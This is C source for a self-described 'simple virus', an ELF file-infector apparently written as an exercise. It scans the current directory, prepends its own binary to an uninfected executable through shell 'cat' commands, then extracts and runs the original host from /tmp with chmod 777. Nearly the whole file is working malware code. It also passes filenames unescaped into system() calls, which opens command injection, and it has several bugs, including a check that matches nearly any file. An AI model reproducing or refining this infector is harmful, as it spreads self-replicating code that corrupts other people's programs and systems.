#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include<sys/types.h>


int infection_check (char filename[])    // cause seg fault 
{
    char taint[] = "simple virus";
    char inff_strings[200];
    char string_command [200];
  

    char grep[]="| grep virus > /tmp/infection_check.txt";
  
   

    snprintf(string_command,sizeof string_command,"%s %s %s","strings",filename, "| grep virus > /tmp/infection_check.txt");
  //  printf("%s\n", filename);
   // printf("%s\n", string_command);
    system(&string_command[0]);   
    FILE *inff;
    inff = fopen("/tmp/infection_check.txt", "r");
    fgets(inff_strings,199,inff);
    return (strstr(inff_strings,taint) != NULL);
}



int is_file_elf(char filename[]){
 	char command[200];
	snprintf(command, sizeof command, "%s%s%s", "file ", filename, " > virus.txt");
    char elf[] = "a";
    char output[200];
    FILE *file;
	system(&command[0]);
    file = fopen("virus.txt", "r");
    fgets(output,199,file);
    return (strstr(output,elf) != NULL);

}

//make a file for infected files
int main(int argc, char const *argv[])
{
    DIR *dir;
    struct dirent *sd;

    FILE *host_file;
    FILE *temp_file;
    //FILE *virus;

    dir = opendir(".");

    while ( (sd=readdir(dir)) != NULL){

        if (!strcmp (sd->d_name, "."))
            continue;
        if (!strcmp (sd->d_name, ".."))    
            continue;
        if (!strcmp (sd->d_name, "virus"))
            continue;
        

        host_file = fopen(sd->d_name, "r");
        if (host_file == NULL)
        {
        //    fprintf(stderr, "Error : Failed to open entry file - %s\n", strerror(errno));
            fclose(host_file);
            continue;
        }
        else {

            if (is_file_elf(sd->d_name)){
                if (!infection_check(sd->d_name)){
                      printf("Hello! I am a simple virus!\n");
                    char command[100];
                 //   command, sizeof command, "%s%s%s%s%s%s", "cat virus ", sd->d_name, " > /tmp/infect046.tmp;mv /tmp/infect046.tmp ", sd->d_name, ";chmod 777 ",sd->d_name
            //        sprintf(command, "cat virus %s > /tmp/counterfeit; mv /tmp/counterfeit %s",sd->d_name, sd->d_name );
                    sprintf(command,"cat virus %s >> /tmp/temp_File; cat /tmp/temp_File > %s",sd->d_name,sd->d_name);
               //     sprintf(payload,"cat virus %s >> /tmp/temp_file; chmod 777 /tmp/temp_file; cat /tmp/temp_file > %s",sd->d_name,sd->d_name);
                    system(command);
                    system("rm /tmp/temp_File");
                    break;

                }

            }
             fclose(host_file);

        }

    }

        
    temp_file = fopen("/tmp/temp_host","w");
    host_file = fopen(argv[0],"r");

    fseek(host_file,0,SEEK_END);
    int host_size = ftell(host_file);

    printf("%d\n", host_size);

    int virus_size = 16465; 
     printf("Hello! I am a simple virus!\n");

    if (!strcmp(argv[0],"virus")){   //run original function
      
        fseek(host_file,0,SEEK_END);
        printf("%d\n", host_size);
        char temp_host[host_size-virus_size];
        fseek(host_file,virus_size,SEEK_SET);
        fread(temp_host,1,host_size-virus_size,host_file);
        fwrite(temp_host,1,host_size-virus_size,temp_file);
        fclose(temp_file);
        system("chmod 777 /tmp/temp_host");

        char command[200] = "";
        int i = 1;
        while(i < argc)
        {
            strcat(command,"/tmp/temp_host");
            strcat(command,argv[i]);
            i++;
        }

        system(command);
        system("rm /tmp/temp_host");
    }
        
    fclose(host_file);



    return 0;

}




